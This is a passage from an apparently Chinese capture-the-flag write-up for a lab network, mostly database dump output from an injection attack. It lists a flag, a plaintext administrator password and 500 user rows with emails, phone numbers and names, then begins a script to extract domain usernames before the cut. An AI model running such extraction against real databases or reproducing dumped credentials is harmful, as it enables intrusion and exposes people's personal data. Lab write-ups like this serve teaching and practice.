</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Database: oa_db
</span></span><span class=line><span class=cl>Table: oa_f1Agggg
</span></span><span class=line><span class=cl>[1 entry]
</span></span><span class=line><span class=cl>+----+--------------------------------------------+
</span></span><span class=line><span class=cl>| id | flag02                                     |
</span></span><span class=line><span class=cl>+----+--------------------------------------------+
</span></span><span class=line><span class=cl>| 1  | flag{b142f5ce-d9b8-4b73-9012-ad75175ba029} |
</span></span><span class=line><span class=cl>+----+--------------------------------------------+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Database: oa_db
</span></span><span class=line><span class=cl>Table: oa_admin
</span></span><span class=line><span class=cl>[1 entry]
</span></span><span class=line><span class=cl>+----+------------------+---------------+
</span></span><span class=line><span class=cl>| id | password         | username      |
</span></span><span class=line><span class=cl>+----+------------------+---------------+
</span></span><span class=line><span class=cl>| 1  | bo2y8kAL3HnXUiQo | administrator |
</span></span><span class=line><span class=cl>+----+------------------+---------------+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Database: oa_db
</span></span><span class=line><span class=cl>Table: oa_users
</span></span><span class=line><span class=cl>[500 entries]
</span></span><span class=line><span class=cl>+-----+----------------------------+-------------+-----------------+
</span></span><span class=line><span class=cl>| id  | email                      | phone       | username        |
</span></span><span class=line><span class=cl>+-----+----------------------------+-------------+-----------------+
</span></span><span class=line><span class=cl>[06:10:24] [WARNING] console output will be trimmed to last 256 rows due to large table size
</span></span><span class=line><span class=cl>| 245 | chenyan@xiaorang.lab       | 18281528743 | CHEN YAN        |
</span></span><span class=line><span class=cl>| 246 | tanggui@xiaorang.lab       | 18060615547 | TANG GUI        |
</span></span><span class=line><span class=cl>| 247 | buning@xiaorang.lab        | 13046481392 | BU NING         |
</span></span><span class=line><span class=cl>| 248 | beishu@xiaorang.lab        | 18268508400 | BEI SHU         |
</span></span><span class=line><span class=cl>| 249 | shushi@xiaorang.lab        | 17770383196 | SHU SHI         |
</span></span><span class=line><span class=cl>| 250 | fuyi@xiaorang.lab          | 18902082658 | FU YI           |
</span></span><span class=line><span class=cl>| 251 | pangcheng@xiaorang.lab     | 18823789530 | PANG CHENG      |
</span></span><span class=line><span class=cl>| 252 | tonghao@xiaorang.lab       | 13370873526 | TONG HAO        |
</span></span><span class=line><span class=cl>| 253 | jiaoshan@xiaorang.lab      | 15375905173 | JIAO SHAN       |
</span></span><span class=line><span class=cl>| 254 | dulun@xiaorang.lab         | 13352331157 | DU LUN          |
</span></span><span class=line><span class=cl>| 255 | kejuan@xiaorang.lab        | 13222550481 | KE JUAN         |
</span></span><span class=line><span class=cl>| 256 | gexin@xiaorang.lab         | 18181553086 | GE XIN          |
</span></span><span class=line><span class=cl>| 257 | lugu@xiaorang.lab          | 18793883130 | LU GU           |
</span></span><span class=line><span class=cl>| 258 | guzaicheng@xiaorang.lab    | 15309377043 | GU ZAI CHENG    |
</span></span><span class=line><span class=cl>| 259 | feicai@xiaorang.lab        | 13077435367 | FEI CAI         |
</span></span><span class=line><span class=cl>| 260 | ranqun@xiaorang.lab        | 18239164662 | RAN QUN         |
</span></span><span class=line><span class=cl>| 261 | zhouyi@xiaorang.lab        | 13169264671 | ZHOU YI         |
</span></span><span class=line><span class=cl>| 262 | shishu@xiaorang.lab        | 18592890189 | SHI SHU         |
</span></span><span class=line><span class=cl>| 263 | yanyun@xiaorang.lab        | 15071085768 | YAN YUN         |
</span></span><span class=line><span class=cl>| 264 | chengqiu@xiaorang.lab      | 13370162980 | CHENG QIU       |
</span></span><span class=line><span class=cl>| 265 | louyou@xiaorang.lab        | 13593582379 | LOU YOU         |
</span></span><span class=line><span class=cl>| 266 | maqun@xiaorang.lab         | 15235945624 | MA QUN          |
</span></span><span class=line><span class=cl>| 267 | wenbiao@xiaorang.lab       | 13620643639 | WEN BIAO        |
</span></span><span class=line><span class=cl>| 268 | weishengshan@xiaorang.lab  | 18670502260 | WEI SHENG SHAN  |
</span></span><span class=line><span class=cl>| 269 | zhangxin@xiaorang.lab      | 15763185760 | ZHANG XIN       |
</span></span><span class=line><span class=cl>| 270 | chuyuan@xiaorang.lab       | 18420545268 | CHU YUAN        |
</span></span><span class=line><span class=cl>| 271 | wenliang@xiaorang.lab      | 13601678032 | WEN LIANG       |
</span></span><span class=line><span class=cl>| 272 | yulvxue@xiaorang.lab       | 18304374901 | YU LV XUE       |
</span></span><span class=line><span class=cl>| 273 | luyue@xiaorang.lab         | 18299785575 | LU YUE          |
</span></span><span class=line><span class=cl>| 274 | ganjian@xiaorang.lab       | 18906111021 | GAN JIAN        |
</span></span><span class=line><span class=cl>| 275 | pangzhen@xiaorang.lab      | 13479328562 | PANG ZHEN       |
</span></span><span class=line><span class=cl>| 276 | guohong@xiaorang.lab       | 18510220597 | GUO HONG        |
</span></span><span class=line><span class=cl>| 277 | lezhong@xiaorang.lab       | 15320909285 | LE ZHONG        |
</span></span><span class=line><span class=cl>| 278 | sheweiyue@xiaorang.lab     | 13736399596 | SHE WEI YUE     |
</span></span><span class=line><span class=cl>| 279 | dujian@xiaorang.lab        | 15058892639 | DU JIAN         |
</span></span><span class=line><span class=cl>| 280 | lidongjin@xiaorang.lab     | 18447207007 | LI DONG JIN     |
</span></span><span class=line><span class=cl>| 281 | hongqun@xiaorang.lab       | 15858462251 | HONG QUN        |
</span></span><span class=line><span class=cl>| 282 | yexing@xiaorang.lab        | 13719043564 | YE XING         |
</span></span><span class=line><span class=cl>| 283 | maoda@xiaorang.lab         | 13878840690 | MAO DA          |
</span></span><span class=line><span class=cl>| 284 | qiaomei@xiaorang.lab       | 13053207462 | QIAO MEI        |
</span></span><span class=line><span class=cl>| 285 | nongzhen@xiaorang.lab      | 15227699960 | NONG ZHEN       |
</span></span><span class=line><span class=cl>| 286 | dongshu@xiaorang.lab       | 15695562947 | DONG SHU        |
</span></span><span class=line><span class=cl>| 287 | zhuzhu@xiaorang.lab        | 13070163385 | ZHU ZHU         |
</span></span><span class=line><span class=cl>| 288 | jiyun@xiaorang.lab         | 13987332999 | JI YUN          |
</span></span><span class=line><span class=cl>| 289 | qiguanrou@xiaorang.lab     | 15605983582 | QI GUAN ROU     |
</span></span><span class=line><span class=cl>| 290 | yixue@xiaorang.lab         | 18451603140 | YI XUE          |
</span></span><span class=line><span class=cl>| 291 | chujun@xiaorang.lab        | 15854942459 | CHU JUN         |
</span></span><span class=line><span class=cl>| 292 | shenshan@xiaorang.lab      | 17712052191 | SHEN SHAN       |
</span></span><span class=line><span class=cl>| 293 | lefen@xiaorang.lab         | 13271196544 | LE FEN          |
</span></span><span class=line><span class=cl>| 294 | yubo@xiaorang.lab          | 13462202742 | YU BO           |
</span></span><span class=line><span class=cl>| 295 | helianrui@xiaorang.lab     | 15383000907 | HE LIAN RUI     |
</span></span><span class=line><span class=cl>| 296 | xuanqun@xiaorang.lab       | 18843916267 | XUAN QUN        |
</span></span><span class=line><span class=cl>| 297 | shangjun@xiaorang.lab      | 15162486698 | SHANG JUN       |
</span></span><span class=line><span class=cl>| 298 | huguang@xiaorang.lab       | 18100586324 | HU GUANG        |
</span></span><span class=line><span class=cl>| 299 | wansifu@xiaorang.lab       | 18494761349 | WAN SI FU       |
</span></span><span class=line><span class=cl>| 300 | fenghong@xiaorang.lab      | 13536727314 | FENG HONG       |
</span></span><span class=line><span class=cl>| 301 | wanyan@xiaorang.lab        | 17890844429 | WAN YAN         |
</span></span><span class=line><span class=cl>| 302 | diyan@xiaorang.lab         | 18534028047 | DI YAN          |
</span></span><span class=line><span class=cl>| 303 | xiangyu@xiaorang.lab       | 13834043047 | XIANG YU        |
</span></span><span class=line><span class=cl>| 304 | songyan@xiaorang.lab       | 15282433280 | SONG YAN        |
</span></span><span class=line><span class=cl>| 305 | fandi@xiaorang.lab         | 15846960039 | FAN DI          |
</span></span><span class=line><span class=cl>| 306 | xiangjuan@xiaorang.lab     | 18120327434 | XIANG JUAN      |
</span></span><span class=line><span class=cl>| 307 | beirui@xiaorang.lab        | 18908661803 | BEI RUI         |
</span></span><span class=line><span class=cl>| 308 | didi@xiaorang.lab          | 13413041463 | DI DI           |
</span></span><span class=line><span class=cl>| 309 | zhubin@xiaorang.lab        | 15909558554 | ZHU BIN         |
</span></span><span class=line><span class=cl>| 310 | lingchun@xiaorang.lab      | 13022790678 | LING CHUN       |
</span></span><span class=line><span class=cl>| 311 | zhenglu@xiaorang.lab       | 13248244873 | ZHENG LU        |
</span></span><span class=line><span class=cl>| 312 | xundi@xiaorang.lab         | 18358493414 | XUN DI          |
</span></span><span class=line><span class=cl>| 313 | wansishun@xiaorang.lab     | 18985028319 | WAN SI SHUN     |
</span></span><span class=line><span class=cl>| 314 | yezongyue@xiaorang.lab     | 13866302416 | YE ZONG YUE     |
</span></span><span class=line><span class=cl>| 315 | bianmei@xiaorang.lab       | 18540879992 | BIAN MEI        |
</span></span><span class=line><span class=cl>| 316 | shanshao@xiaorang.lab      | 18791488918 | SHAN SHAO       |
</span></span><span class=line><span class=cl>| 317 | zhenhui@xiaorang.lab       | 13736784817 | ZHEN HUI        |
</span></span><span class=line><span class=cl>| 318 | chengli@xiaorang.lab       | 15913267394 | CHENG LI        |
</span></span><span class=line><span class=cl>| 319 | yufen@xiaorang.lab         | 18432795588 | YU FEN          |
</span></span><span class=line><span class=cl>| 320 | jiyi@xiaorang.lab          | 13574211454 | JI YI           |
</span></span><span class=line><span class=cl>| 321 | panbao@xiaorang.lab        | 13675851303 | PAN BAO         |
</span></span><span class=line><span class=cl>| 322 | mennane@xiaorang.lab       | 15629706208 | MEN NAN E       |
</span></span><span class=line><span class=cl>| 323 | fengsi@xiaorang.lab        | 13333432577 | FENG SI         |
</span></span><span class=line><span class=cl>| 324 | mingyan@xiaorang.lab       | 18296909463 | MING YAN        |
</span></span><span class=line><span class=cl>| 325 | luoyou@xiaorang.lab        | 15759321415 | LUO YOU         |
</span></span><span class=line><span class=cl>| 326 | liangduanqing@xiaorang.lab | 13150744785 | LIANG DUAN QING |
</span></span><span class=line><span class=cl>| 327 | nongyan@xiaorang.lab       | 18097386975 | NONG YAN        |
</span></span><span class=line><span class=cl>| 328 | haolun@xiaorang.lab        | 15152700465 | HAO LUN         |
</span></span><span class=line><span class=cl>| 329 | oulun@xiaorang.lab         | 13402760696 | OU LUN          |
</span></span><span class=line><span class=cl>| 330 | weichipeng@xiaorang.lab    | 18057058937 | WEI CHI PENG    |
</span></span><span class=line><span class=cl>| 331 | qidiaofang@xiaorang.lab    | 18728297829 | QI DIAO FANG    |
</span></span><span class=line><span class=cl>| 332 | xuehe@xiaorang.lab         | 13398862169 | XUE HE          |
</span></span><span class=line><span class=cl>| 333 | chensi@xiaorang.lab        | 18030178713 | CHEN SI         |
</span></span><span class=line><span class=cl>| 334 | guihui@xiaorang.lab        | 17882514129 | GUI HUI         |
</span></span><span class=line><span class=cl>| 335 | fuyue@xiaorang.lab         | 18298436549 | FU YUE          |
</span></span><span class=line><span class=cl>| 336 | wangxing@xiaorang.lab      | 17763645267 | WANG XING       |
</span></span><span class=line><span class=cl>| 337 | zhengxiao@xiaorang.lab     | 18673968392 | ZHENG XIAO      |
</span></span><span class=line><span class=cl>| 338 | guhui@xiaorang.lab         | 15166711352 | GU HUI          |
</span></span><span class=line><span class=cl>| 339 | baoai@xiaorang.lab         | 15837430827 | BAO AI          |
</span></span><span class=line><span class=cl>| 340 | hangzhao@xiaorang.lab      | 13235488232 | HANG ZHAO       |
</span></span><span class=line><span class=cl>| 341 | xingye@xiaorang.lab        | 13367587521 | XING YE         |
</span></span><span class=line><span class=cl>| 342 | qianyi@xiaorang.lab        | 18657807767 | QIAN YI         |
</span></span><span class=line><span class=cl>| 343 | xionghong@xiaorang.lab     | 17725874584 | XIONG HONG      |
</span></span><span class=line><span class=cl>| 344 | zouqi@xiaorang.lab         | 15300430128 | ZOU QI          |
</span></span><span class=line><span class=cl>| 345 | rongbiao@xiaorang.lab      | 13034242682 | RONG BIAO       |
</span></span><span class=line><span class=cl>| 346 | gongxin@xiaorang.lab       | 15595839880 | GONG XIN        |
</span></span><span class=line><span class=cl>| 347 | luxing@xiaorang.lab        | 18318675030 | LU XING         |
</span></span><span class=line><span class=cl>| 348 | huayan@xiaorang.lab        | 13011805354 | HUA YAN         |
</span></span><span class=line><span class=cl>| 349 | duyue@xiaorang.lab         | 15515878208 | DU YUE          |
</span></span><span class=line><span class=cl>| 350 | xijun@xiaorang.lab         | 17871583183 | XI JUN          |
</span></span><span class=line><span class=cl>| 351 | daiqing@xiaorang.lab       | 18033226216 | DAI QING        |
</span></span><span class=line><span class=cl>| 352 | yingbiao@xiaorang.lab      | 18633421863 | YING BIAO       |
</span></span><span class=line><span class=cl>| 353 | hengteng@xiaorang.lab      | 15956780740 | HENG TENG       |
</span></span><span class=line><span class=cl>| 354 | changwu@xiaorang.lab       | 15251485251 | CHANG WU        |
</span></span><span class=line><span class=cl>| 355 | chengying@xiaorang.lab     | 18788248715 | CHENG YING      |
</span></span><span class=line><span class=cl>| 356 | luhong@xiaorang.lab        | 17766091079 | LU HONG         |
</span></span><span class=line><span class=cl>| 357 | tongxue@xiaorang.lab       | 18466102780 | TONG XUE        |
</span></span><span class=line><span class=cl>| 358 | xiangqian@xiaorang.lab     | 13279611385 | XIANG QIAN      |
</span></span><span class=line><span class=cl>| 359 | shaokang@xiaorang.lab      | 18042645434 | SHAO KANG       |
</span></span><span class=line><span class=cl>| 360 | nongzhu@xiaorang.lab       | 13934236634 | NONG ZHU        |
</span></span><span class=line><span class=cl>| 361 | haomei@xiaorang.lab        | 13406913218 | HAO MEI         |
</span></span><span class=line><span class=cl>| 362 | maoqing@xiaorang.lab       | 15713298425 | MAO QING        |
</span></span><span class=line><span class=cl>| 363 | xiai@xiaorang.lab          | 18148404789 | XI AI           |
</span></span><span class=line><span class=cl>| 364 | bihe@xiaorang.lab          | 13628593791 | BI HE           |
</span></span><span class=line><span class=cl>| 365 | gaoli@xiaorang.lab         | 15814408188 | GAO LI          |
</span></span><span class=line><span class=cl>| 366 | jianggong@xiaorang.lab     | 15951118926 | JIANG GONG      |
</span></span><span class=line><span class=cl>| 367 | pangning@xiaorang.lab      | 13443921700 | PANG NING       |
</span></span><span class=line><span class=cl>| 368 | ruishi@xiaorang.lab        | 15803112819 | RUI SHI         |
</span></span><span class=line><span class=cl>| 369 | wuhuan@xiaorang.lab        | 13646953078 | WU HUAN         |
</span></span><span class=line><span class=cl>| 370 | qiaode@xiaorang.lab        | 13543564200 | QIAO DE         |
</span></span><span class=line><span class=cl>| 371 | mayong@xiaorang.lab        | 15622971484 | MA YONG         |
</span></span><span class=line><span class=cl>| 372 | hangda@xiaorang.lab        | 15937701659 | HANG DA         |
</span></span><span class=line><span class=cl>| 373 | changlu@xiaorang.lab       | 13734991654 | CHANG LU        |
</span></span><span class=line><span class=cl>| 374 | liuyuan@xiaorang.lab       | 15862054540 | LIU YUAN        |
</span></span><span class=line><span class=cl>| 375 | chenggu@xiaorang.lab       | 15706685526 | CHENG GU        |
</span></span><span class=line><span class=cl>| 376 | shentuyun@xiaorang.lab     | 15816902379 | SHEN TU YUN     |
</span></span><span class=line><span class=cl>| 377 | zhuangsong@xiaorang.lab    | 17810274262 | ZHUANG SONG     |
</span></span><span class=line><span class=cl>| 378 | chushao@xiaorang.lab       | 18822001640 | CHU SHAO        |
</span></span><span class=line><span class=cl>| 379 | heli@xiaorang.lab          | 13701347081 | HE LI           |
</span></span><span class=line><span class=cl>| 380 | haoming@xiaorang.lab       | 15049615282 | HAO MING        |
</span></span><span class=line><span class=cl>| 381 | xieyi@xiaorang.lab         | 17840660107 | XIE YI          |
</span></span><span class=line><span class=cl>| 382 | shangjie@xiaorang.lab      | 15025010410 | SHANG JIE       |
</span></span><span class=line><span class=cl>| 383 | situxin@xiaorang.lab       | 18999728941 | SI TU XIN       |
</span></span><span class=line><span class=cl>| 384 | linxi@xiaorang.lab         | 18052976097 | LIN XI          |
</span></span><span class=line><span class=cl>| 385 | zoufu@xiaorang.lab         | 15264535633 | ZOU FU          |
</span></span><span class=line><span class=cl>| 386 | qianqing@xiaorang.lab      | 18668594658 | QIAN QING       |
</span></span><span class=line><span class=cl>| 387 | qiai@xiaorang.lab          | 18154690198 | QI AI           |
</span></span><span class=line><span class=cl>| 388 | ruilin@xiaorang.lab        | 13654483014 | RUI LIN         |
</span></span><span class=line><span class=cl>| 389 | luomeng@xiaorang.lab       | 15867095032 | LUO MENG        |
</span></span><span class=line><span class=cl>| 390 | huaren@xiaorang.lab        | 13307653720 | HUA REN         |
</span></span><span class=line><span class=cl>| 391 | yanyangmei@xiaorang.lab    | 15514015453 | YAN YANG MEI    |
</span></span><span class=line><span class=cl>| 392 | zuofen@xiaorang.lab        | 15937087078 | ZUO FEN         |
</span></span><span class=line><span class=cl>| 393 | manyuan@xiaorang.lab       | 18316106061 | MAN YUAN        |
</span></span><span class=line><span class=cl>| 394 | yuhui@xiaorang.lab         | 18058257228 | YU HUI          |
</span></span><span class=line><span class=cl>| 395 | sunli@xiaorang.lab         | 18233801124 | SUN LI          |
</span></span><span class=line><span class=cl>| 396 | guansixin@xiaorang.lab     | 13607387740 | GUAN SI XIN     |
</span></span><span class=line><span class=cl>| 397 | ruisong@xiaorang.lab       | 13306021674 | RUI SONG        |
</span></span><span class=line><span class=cl>| 398 | qiruo@xiaorang.lab         | 13257810331 | QI RUO          |
</span></span><span class=line><span class=cl>| 399 | jinyu@xiaorang.lab         | 18565922652 | JIN YU          |
</span></span><span class=line><span class=cl>| 400 | shoujuan@xiaorang.lab      | 18512174415 | SHOU JUAN       |
</span></span><span class=line><span class=cl>| 401 | yanqian@xiaorang.lab       | 13799789435 | YAN QIAN        |
</span></span><span class=line><span class=cl>| 402 | changyun@xiaorang.lab      | 18925015029 | CHANG YUN       |
</span></span><span class=line><span class=cl>| 403 | hualu@xiaorang.lab         | 13641470801 | HUA LU          |
</span></span><span class=line><span class=cl>| 404 | huanming@xiaorang.lab      | 15903282860 | HUAN MING       |
</span></span><span class=line><span class=cl>| 405 | baoshao@xiaorang.lab       | 13795275611 | BAO SHAO        |
</span></span><span class=line><span class=cl>| 406 | hongmei@xiaorang.lab       | 13243605925 | HONG MEI        |
</span></span><span class=line><span class=cl>| 407 | manyun@xiaorang.lab        | 13238107359 | MAN YUN         |
</span></span><span class=line><span class=cl>| 408 | changwan@xiaorang.lab      | 13642205622 | CHANG WAN       |
</span></span><span class=line><span class=cl>| 409 | wangyan@xiaorang.lab       | 13242486231 | WANG YAN        |
</span></span><span class=line><span class=cl>| 410 | shijian@xiaorang.lab       | 15515077573 | SHI JIAN        |
</span></span><span class=line><span class=cl>| 411 | ruibei@xiaorang.lab        | 18157706586 | RUI BEI         |
</span></span><span class=line><span class=cl>| 412 | jingshao@xiaorang.lab      | 18858376544 | JING SHAO       |
</span></span><span class=line><span class=cl>| 413 | jinzhi@xiaorang.lab        | 18902437082 | JIN ZHI         |
</span></span><span class=line><span class=cl>| 414 | yuhui@xiaorang.lab         | 15215599294 | YU HUI          |
</span></span><span class=line><span class=cl>| 415 | zangpeng@xiaorang.lab      | 18567574150 | ZANG PENG       |
</span></span><span class=line><span class=cl>| 416 | changyun@xiaorang.lab      | 15804640736 | CHANG YUN       |
</span></span><span class=line><span class=cl>| 417 | yetai@xiaorang.lab         | 13400150018 | YE TAI          |
</span></span><span class=line><span class=cl>| 418 | luoxue@xiaorang.lab        | 18962643265 | LUO XUE         |
</span></span><span class=line><span class=cl>| 419 | moqian@xiaorang.lab        | 18042706956 | MO QIAN         |
</span></span><span class=line><span class=cl>| 420 | xupeng@xiaorang.lab        | 15881934759 | XU PENG         |
</span></span><span class=line><span class=cl>| 421 | ruanyong@xiaorang.lab      | 15049703903 | RUAN YONG       |
</span></span><span class=line><span class=cl>| 422 | guliangxian@xiaorang.lab   | 18674282714 | GU LIANG XIAN   |
</span></span><span class=line><span class=cl>| 423 | yinbin@xiaorang.lab        | 15734030492 | YIN BIN         |
</span></span><span class=line><span class=cl>| 424 | huarui@xiaorang.lab        | 17699257041 | HUA RUI         |
</span></span><span class=line><span class=cl>| 425 | niuya@xiaorang.lab         | 13915041589 | NIU YA          |
</span></span><span class=line><span class=cl>| 426 | guwei@xiaorang.lab         | 13584571917 | GU WEI          |
</span></span><span class=line><span class=cl>| 427 | qinguan@xiaorang.lab       | 18427953434 | QIN GUAN        |
</span></span><span class=line><span class=cl>| 428 | yangdanhan@xiaorang.lab    | 15215900100 | YANG DAN HAN    |
</span></span><span class=line><span class=cl>| 429 | yingjun@xiaorang.lab       | 13383367818 | YING JUN        |
</span></span><span class=line><span class=cl>| 430 | weiwan@xiaorang.lab        | 13132069353 | WEI WAN         |
</span></span><span class=line><span class=cl>| 431 | sunduangu@xiaorang.lab     | 15737981701 | SUN DUAN GU     |
</span></span><span class=line><span class=cl>| 432 | sisiwu@xiaorang.lab        | 18021600640 | SI SI WU        |
</span></span><span class=line><span class=cl>| 433 | nongyan@xiaorang.lab       | 13312613990 | NONG YAN        |
</span></span><span class=line><span class=cl>| 434 | xuanlu@xiaorang.lab        | 13005748230 | XUAN LU         |
</span></span><span class=line><span class=cl>| 435 | yunzhong@xiaorang.lab      | 15326746780 | YUN ZHONG       |
</span></span><span class=line><span class=cl>| 436 | gengfei@xiaorang.lab       | 13905027813 | GENG FEI        |
</span></span><span class=line><span class=cl>| 437 | zizhuansong@xiaorang.lab   | 13159301262 | ZI ZHUAN SONG   |
</span></span><span class=line><span class=cl>| 438 | ganbailong@xiaorang.lab    | 18353612904 | GAN BAI LONG    |
</span></span><span class=line><span class=cl>| 439 | shenjiao@xiaorang.lab      | 15164719751 | SHEN JIAO       |
</span></span><span class=line><span class=cl>| 440 | zangyao@xiaorang.lab       | 18707028470 | ZANG YAO        |
</span></span><span class=line><span class=cl>| 441 | yangdanhe@xiaorang.lab     | 18684281105 | YANG DAN HE     |
</span></span><span class=line><span class=cl>| 442 | chengliang@xiaorang.lab    | 13314617161 | CHENG LIANG     |
</span></span><span class=line><span class=cl>| 443 | xudi@xiaorang.lab          | 18498838233 | XU DI           |
</span></span><span class=line><span class=cl>| 444 | wulun@xiaorang.lab         | 18350490780 | WU LUN          |
</span></span><span class=line><span class=cl>| 445 | yuling@xiaorang.lab        | 18835870616 | YU LING         |
</span></span><span class=line><span class=cl>| 446 | taoya@xiaorang.lab         | 18494928860 | TAO YA          |
</span></span><span class=line><span class=cl>| 447 | jinle@xiaorang.lab         | 15329208123 | JIN LE          |
</span></span><span class=line><span class=cl>| 448 | youchao@xiaorang.lab       | 13332964189 | YOU CHAO        |
</span></span><span class=line><span class=cl>| 449 | liangduanzhi@xiaorang.lab  | 15675237494 | LIANG DUAN ZHI  |
</span></span><span class=line><span class=cl>| 450 | jiagupiao@xiaorang.lab     | 17884962455 | JIA GU PIAO     |
</span></span><span class=line><span class=cl>| 451 | ganze@xiaorang.lab         | 17753508925 | GAN ZE          |
</span></span><span class=line><span class=cl>| 452 | jiangqing@xiaorang.lab     | 15802357200 | JIANG QING      |
</span></span><span class=line><span class=cl>| 453 | jinshan@xiaorang.lab       | 13831466303 | JIN SHAN        |
</span></span><span class=line><span class=cl>| 454 | zhengpubei@xiaorang.lab    | 13690156563 | ZHENG PU BEI    |
</span></span><span class=line><span class=cl>| 455 | cuicheng@xiaorang.lab      | 17641589842 | CUI CHENG       |
</span></span><span class=line><span class=cl>| 456 | qiyong@xiaorang.lab        | 13485427829 | QI YONG         |
</span></span><span class=line><span class=cl>| 457 | qizhu@xiaorang.lab         | 18838859844 | QI ZHU          |
</span></span><span class=line><span class=cl>| 458 | ganjian@xiaorang.lab       | 18092585003 | GAN JIAN        |
</span></span><span class=line><span class=cl>| 459 | yurui@xiaorang.lab         | 15764121637 | YU RUI          |
</span></span><span class=line><span class=cl>| 460 | feishu@xiaorang.lab        | 18471512248 | FEI SHU         |
</span></span><span class=line><span class=cl>| 461 | chenxin@xiaorang.lab       | 13906545512 | CHEN XIN        |
</span></span><span class=line><span class=cl>| 462 | shengzhe@xiaorang.lab      | 18936457394 | SHENG ZHE       |
</span></span><span class=line><span class=cl>| 463 | wohong@xiaorang.lab        | 18404022650 | WO HONG         |
</span></span><span class=line><span class=cl>| 464 | manzhi@xiaorang.lab        | 15973350408 | MAN ZHI         |
</span></span><span class=line><span class=cl>| 465 | xiangdong@xiaorang.lab     | 13233908989 | XIANG DONG      |
</span></span><span class=line><span class=cl>| 466 | weihui@xiaorang.lab        | 15035834945 | WEI HUI         |
</span></span><span class=line><span class=cl>| 467 | xingquan@xiaorang.lab      | 18304752969 | XING QUAN       |
</span></span><span class=line><span class=cl>| 468 | miaoshu@xiaorang.lab       | 15121570939 | MIAO SHU        |
</span></span><span class=line><span class=cl>| 469 | gongwan@xiaorang.lab       | 18233990398 | GONG WAN        |
</span></span><span class=line><span class=cl>| 470 | qijie@xiaorang.lab         | 15631483536 | QI JIE          |
</span></span><span class=line><span class=cl>| 471 | shaoting@xiaorang.lab      | 15971628914 | SHAO TING       |
</span></span><span class=line><span class=cl>| 472 | xiqi@xiaorang.lab          | 18938747522 | XI QI           |
</span></span><span class=line><span class=cl>| 473 | jinghong@xiaorang.lab      | 18168293686 | JING HONG       |
</span></span><span class=line><span class=cl>| 474 | qianyou@xiaorang.lab       | 18841322688 | QIAN YOU        |
</span></span><span class=line><span class=cl>| 475 | chuhua@xiaorang.lab        | 15819380754 | CHU HUA         |
</span></span><span class=line><span class=cl>| 476 | yanyue@xiaorang.lab        | 18702474361 | YAN YUE         |
</span></span><span class=line><span class=cl>| 477 | huangjia@xiaorang.lab      | 13006878166 | HUANG JIA       |
</span></span><span class=line><span class=cl>| 478 | zhouchun@xiaorang.lab      | 13545820679 | ZHOU CHUN       |
</span></span><span class=line><span class=cl>| 479 | jiyu@xiaorang.lab          | 18650881187 | JI YU           |
</span></span><span class=line><span class=cl>| 480 | wendong@xiaorang.lab       | 17815264093 | WEN DONG        |
</span></span><span class=line><span class=cl>| 481 | heyuan@xiaorang.lab        | 18710821773 | HE YUAN         |
</span></span><span class=line><span class=cl>| 482 | mazhen@xiaorang.lab        | 18698248638 | MA ZHEN         |
</span></span><span class=line><span class=cl>| 483 | shouchun@xiaorang.lab      | 15241369178 | SHOU CHUN       |
</span></span><span class=line><span class=cl>| 484 | liuzhe@xiaorang.lab        | 18530936084 | LIU ZHE         |
</span></span><span class=line><span class=cl>| 485 | fengbo@xiaorang.lab        | 15812110254 | FENG BO         |
</span></span><span class=line><span class=cl>| 486 | taigongyuan@xiaorang.lab   | 15943349034 | TAI GONG YUAN   |
</span></span><span class=line><span class=cl>| 487 | gesheng@xiaorang.lab       | 18278508909 | GE SHENG        |
</span></span><span class=line><span class=cl>| 488 | songming@xiaorang.lab      | 13220512663 | SONG MING       |
</span></span><span class=line><span class=cl>| 489 | yuwan@xiaorang.lab         | 15505678035 | YU WAN          |
</span></span><span class=line><span class=cl>| 490 | diaowei@xiaorang.lab       | 13052582975 | DIAO WEI        |
</span></span><span class=line><span class=cl>| 491 | youyi@xiaorang.lab         | 18036808394 | YOU YI          |
</span></span><span class=line><span class=cl>| 492 | rongxianyu@xiaorang.lab    | 18839918955 | RONG XIAN YU    |
</span></span><span class=line><span class=cl>| 493 | fuyi@xiaorang.lab          | 15632151678 | FU YI           |
</span></span><span class=line><span class=cl>| 494 | linli@xiaorang.lab         | 17883399275 | LIN LI          |
</span></span><span class=line><span class=cl>| 495 | weixue@xiaorang.lab        | 18672465853 | WEI XUE         |
</span></span><span class=line><span class=cl>| 496 | hejuan@xiaorang.lab        | 13256081102 | HE JUAN         |
</span></span><span class=line><span class=cl>| 497 | zuoqiutai@xiaorang.lab     | 18093001354 | ZUO QIU TAI     |
</span></span><span class=line><span class=cl>| 498 | siyi@xiaorang.lab          | 17873307773 | SI YI           |
</span></span><span class=line><span class=cl>| 499 | shenshan@xiaorang.lab      | 18397560369 | SHEN SHAN       |
</span></span><span class=line><span class=cl>| 500 | tongdong@xiaorang.lab      | 15177549595 | TONG DONG       |
</span></span><span class=line><span class=cl>+-----+----------------------------+-------------+-----------------+
</span></span></code></pre></td></tr></table></div></div><h2 id=flag3flag4>flag3&&amp;flag4</h2><p>得到域用户名，我们写个脚本给提取出来</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/usr/bin/env python3
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>def extract_usernames<span class=o>(</span>filename<span class=o>)</span>:
